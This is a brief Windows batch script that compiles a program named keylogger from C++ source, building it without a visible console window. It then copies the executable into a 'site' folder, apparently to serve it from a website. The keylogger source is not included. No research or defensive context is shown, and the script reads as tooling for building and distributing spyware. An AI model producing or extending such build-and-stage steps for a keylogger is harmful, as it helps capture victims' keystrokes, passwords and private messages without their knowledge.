@echo off
echo Compiling keylogger...
g++ keylogger.cpp -o keylogger.exe -luser32 -lkernel32 -mwindows
if %errorlevel% equ 0 (
    echo Compilation successful! keylogger.exe created.
    copy /Y keylogger.exe site\keylogger.exe
    echo Copied keylogger.exe to site folder.
) else (
    echo Compilation failed!
    pause
)